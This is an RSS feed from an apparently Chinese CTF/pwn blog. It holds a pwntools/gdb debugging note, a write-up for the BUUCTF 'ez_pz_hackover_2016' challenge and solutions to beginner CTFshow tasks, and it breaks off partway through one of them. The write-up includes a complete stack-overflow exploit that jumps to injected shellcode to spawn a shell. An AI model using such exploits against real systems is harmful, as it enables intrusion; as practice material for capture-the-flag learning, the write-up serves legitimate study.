<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Blog • Posts by &#34;ctf&#34; category</title>
        <link>https://vvwwvv.cn</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Mon, 18 Sep 2023 19:53:15 +0800</pubDate>
        <lastBuildDate>Mon, 18 Sep 2023 19:53:15 +0800</lastBuildDate>
        <category>Java</category>
        <category>pwn</category>
        <category>二进制</category>
        <category>C语言</category>
        <category>Linux</category>
        <category>ret2csu</category>
        <category>fastbin.attack</category>
        <category>ctf</category>
        <category>nc</category>
        <category>系统调用</category>
        <category>windows</category>
        <category>渗透</category>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2023/09/18/pwn/gdb%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/</guid>
            <title>gdb本地调试，基于pwndbg</title>
            <link>https://vvwwvv.cn/2023/09/18/pwn/gdb%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/</link>
            <category>pwn</category>
            <category>二进制</category>
            <pubDate>Mon, 18 Sep 2023 19:53:15 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;此处用于记录在编写脚本中对程序的调试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#此处用于记录在编写脚本中对程序的调试&#34;&gt;#&lt;/a&gt; 此处用于记录在编写脚本中对程序的调试&lt;/h1&gt;
&lt;p&gt;因为有时要输入不可见字符，导致我们没办法进行直接在 gdb 内调试，所以需要相应的在脚本中调试&lt;/p&gt;
&lt;h2 id=&#34;1调试方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1调试方法&#34;&gt;#&lt;/a&gt; 1. 调试方法：&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;span&gt;n&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gdb&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;attach&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;b *断点地址&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pause&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#第一个 pause&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pause&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#第二个 pause&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;此处的重点就是在发送 &lt;code&gt;payload&lt;/code&gt;  前加入 &lt;code&gt;gdb.attach(p)&lt;/code&gt;  和 &lt;code&gt;pause()&lt;/code&gt; ，发送 &lt;code&gt;payload&lt;/code&gt;  后加入 &lt;code&gt;pause()&lt;/code&gt; ，然后在产生的新终端内设置断点（也可以在前面直接设置断点： &lt;code&gt;gdb.attach(p,&amp;quot;b *0x8048600&amp;quot;)&lt;/code&gt; ）&lt;/p&gt;
&lt;p&gt;然后新终端内输入 &lt;code&gt;c&lt;/code&gt;  继续执行，旧终端内按下回车便可以进行查询得到相应的栈情况&lt;/p&gt;
&lt;p&gt;不知道为什么要加入两个 &lt;code&gt;pause（）&lt;/code&gt; 才行，前面一个防止程序直接发送结束，无法加入断点；后面一个不加入会导致无法读取栈的情况（程序貌似没有运行结束，个人猜测是设置断点的地方已经不需要栈了）&lt;/p&gt;
&lt;h2 id=&#34;2调试例子&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2调试例子&#34;&gt;#&lt;/a&gt; 2. 调试例子：&lt;/h2&gt;
&lt;p&gt;左边为新终端，右边为旧终端（pid 相同）&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/18/pP4tKjP.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
此时已经在代码里设置好了断点，在新终端内输入 &lt;code&gt;c&lt;/code&gt; , 旧终端按回车即可&lt;/p&gt;
&lt;p&gt;可以看到已经发送了 &lt;code&gt;payload&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/18/pP4tt9s.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;可以看到已经发送的内容到了栈上&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/18/pP4NGqK.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
 (输入的值是 crashme，由于是小端序所以要倒着读，c 是 63，r 是 72，所以输入的位置是 0x22)&lt;/p&gt;
&lt;p&gt;上述例子具体的代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-pyhton&#34;&gt;from pwn import *
p=process(&#39;./ez_pz_hackover_2016&#39;)
context.log_level=&#39;debug&#39;
 
gdb.attach(p)  ## 会在此处再打开一个终端
# &#39;b *0x8048600&#39;  ##在该终端下设置对应断点（要设置在对应函数结束之前），设置完后必须在新终端按下“c”来继续进行，再在旧终端里按下回车
，
p.recvuntil(&#39;crash: &#39;)
stack=int(p.recv(10),16)#接收s在栈上的地址

payload=&#39;crashme\x00&#39;+&#39;aaaaaa&#39;#crashme\x00绕过if判断      

pause()  #必须要在发送的payload前面，不然直接发送结束无法查询了
p.sendline(payload)
 
pause()  #
&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2023/09/17/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ez_pz_hackover_2016/</guid>
            <title>ez_pz_hackover_2016（）</title>
            <link>https://vvwwvv.cn/2023/09/17/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ez_pz_hackover_2016/</link>
            <category>pwn</category>
            <pubDate>Sun, 17 Sep 2023 22:30:51 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;1查看程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1查看程序&#34;&gt;#&lt;/a&gt; 1. 查看程序&lt;/h1&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img1.imgtp.com/2023/09/17/ymMrfyf3.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
发现没有开启 NX，有 rwx 段，可以利用 shellcode&lt;/p&gt;
&lt;p&gt;利用 ida 查看&lt;br /&gt;
&lt;img data-src=&#34;https://img1.imgtp.com/2023/09/17/5VybmqFr.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img1.imgtp.com/2023/09/17/cG6l8WkS.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img1.imgtp.com/2023/09/17/Aib7xfrT.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img1.imgtp.com/2023/09/17/6xAZOCsq.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;因为要写入 shellcode 并执行，所以我们需要利用栈溢出&lt;/p&gt;
&lt;p&gt;chall 函数里的 fget 因为大小限制为 1024（0x400），所以我们无法溢出，但是，该函数末尾有个 vuln（s，0x400），里面的 memcpy 函数会将 s，复制给 dest，且有 0x400 的大小可以进行溢出。&lt;/p&gt;
&lt;p&gt;我们需要绕过 &lt;code&gt;strcmp(s,crashme)&lt;/code&gt; , 可以利用 &lt;code&gt;\x00&lt;/code&gt;  截断&lt;/p&gt;
&lt;h1 id=&#34;2漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2漏洞利用&#34;&gt;#&lt;/a&gt; 2. 漏洞利用&lt;/h1&gt;
&lt;p&gt;我们通过执行 shellcode 来 getshell，通过 &lt;code&gt;vuln&lt;/code&gt;  函数中的 &lt;code&gt;memcpy函数&lt;/code&gt; 进行复制来导致溢出，让我们返回到 &lt;code&gt;shellcode&lt;/code&gt;  的地址，去执行&lt;/p&gt;
&lt;p&gt;由于分配的栈每次都是随机分配的，所以地址是变化的，导致我们需要的 &lt;code&gt;shellcode&lt;/code&gt;  地址也是变动的&lt;/p&gt;
&lt;p&gt;偏移量是定值，在 &lt;code&gt;chall&lt;/code&gt;  函数中首先会给一个 &lt;code&gt;s&lt;/code&gt;  的地址， &lt;code&gt;s&lt;/code&gt;  也在栈上（但是在不同的函数栈上），我们可以用得到的 s，加上调试找到的 &lt;code&gt;shellcode&lt;/code&gt;  地址算出偏移量，利用固定的偏移量来计算后面的 &lt;code&gt;shellcode&lt;/code&gt;  地址&lt;/p&gt;
&lt;p&gt;字符串 s 的地址高地址，要输入的 shellcode 地址为低地址&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/18/pP4aBHf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;offset=0xfffdc7ac-0xfffdc790=0x1c=28&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其余只需要用 &lt;code&gt;\x00&lt;/code&gt;  绕过 &lt;code&gt;strcpy()&lt;/code&gt;  函数即可&lt;/p&gt;
&lt;p&gt;【注意】&lt;/p&gt;
&lt;p&gt;该题的 &lt;code&gt;dest&lt;/code&gt;  栈的偏移在 ida 中有偏差，我们进行手动调试&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-pyhton&#34;&gt;from pwn import *
p=process(&#39;./ez_pz_hackover_2016&#39;)
context.log_level=&#39;debug&#39;
 
gdb.attach(p)  ## 会在此处再打开一个终端
# &#39;b *0x8048600&#39;  ##在该终端下设置对应断点（要设置在对应函数结束之前），设置完后必须在新终端按下“c”来继续进行，再在旧终端里按下回车
，
p.recvuntil(&#39;crash: &#39;)
stack=int(p.recv(10),16)#接收s在栈上的地址

payload=&#39;crashme\x00&#39;+&#39;aaaaaa&#39;#crashme\x00绕过if判断      

pause()  #必须要在发送的payload前面，不然直接发送结束无法查询了
p.sendline(payload)
 
pause()  #必要的，不能少
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;调试步骤见文章 &lt;code&gt;gdb本地调试&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/18/pP4d6Z6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;从上图中看到 ebp 地址为 &lt;code&gt;0xfffdc788&lt;/code&gt; ,esp &lt;code&gt;0xfffdc750&lt;/code&gt; , 相对偏移为 0x38（ebp-esp），我们输入的内容从偏移 0x22 开始（小端序倒着读），从这可以看到我们需要填充的 &lt;code&gt;padding&lt;/code&gt;  大小为 0x16+4（0x38-0x22+4）从未输入 crashme 开始算&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;span&gt;n&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;crashme\x00&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x16&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;stack_add&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;shellcode &lt;span class=&#34;token comment&#34;&gt;#减 8 为前面的 &#34;crashme\x00&#34; 的长度 (\x00 为 1)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;3-exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-exp&#34;&gt;#&lt;/a&gt; 3. exp&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;span&gt;n&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#context.log_level = &#39;debug&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;os&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;linux&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arch&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;i386&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; log_level&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;process&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./ez_pz_hackover_2016&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#p=remote(&#39;node4.buuoj.cn&#39;,28249)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#gdb.attach(p,&#34;b *0x8048600&#34;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shellcode &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; asm&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;shellcraft&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sh&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;lets crash: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;stack&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;offset&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x1c&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&gt; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;crashme\x00&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x16&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;stack&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x1c&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;shellcode &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;打通本地&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/18/pP4w5hF.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;得到 flag&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/18/pP4wvtO.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow/</guid>
            <title>CTFshow(Test_your_nc部分,0~4)</title>
            <link>https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow/</link>
            <category>pwn</category>
            <category>nc</category>
            <pubDate>Fri, 15 Sep 2023 11:01:15 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;pwn0&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn0&#34;&gt;#&lt;/a&gt; pwn0&lt;/h1&gt;
&lt;h2 id=&#34;题目&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWt1sS.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;利用 ssh 连接，不知道为什么之前连接是失败的&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWffpV.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;然后输入密码会加载一大堆东西&lt;/p&gt;
&lt;p&gt;而且密码不在当前目录下需要到根目录查看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWfLfx.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn1&#34;&gt;#&lt;/a&gt; pwn1&lt;/h1&gt;
&lt;h2 id=&#34;题目-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-2&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWhgDe.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;题目里已经说明有后门了，下载附件利用 ida 打开&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWhqbQ.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;发现输出完句子之后会直接执行 cat flag，那么直接 nc 连接即可&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWhXUs.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn2&#34;&gt;#&lt;/a&gt; pwn2&lt;/h1&gt;
&lt;h2 id=&#34;题目-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-3&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPW4pvT.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;下载附件查看程序信息，发现是 64 位程序&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPW4WsU.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;ida 打开&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWL4e0.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
发现有个 system (/bin/sh), 直接 给权限了，那么就直接可以获取 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWL7YF.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn3&#34;&gt;#&lt;/a&gt; pwn3&lt;/h1&gt;
&lt;h2 id=&#34;题目-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-4&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWLLl9.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;查看保护是 64 位程序，ida 打开&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWLzTK.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWOCfe.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWOFld.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里考察我们对函数的理解&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;put 函数输出的是字符串&lt;/li&gt;
&lt;li&gt;echo 主要用于打印简单的字符串和变量值&lt;/li&gt;
&lt;li&gt;cat 用来查看文件内容，更侧重于处理文件，实现文件内容的读取和拼接等操作&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(只有 system (cat /flag) 输出了 flag，选择 4 只会输出字符串”/ctfshow_flag“)&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWOllj.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn4&#34;&gt;#&lt;/a&gt; pwn4&lt;/h1&gt;
&lt;h2 id=&#34;题目-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目-5&#34;&gt;#&lt;/a&gt; 题目&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/15/pPWOonI.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;查看程序是 64 位，用 ida 打开&lt;br /&gt;
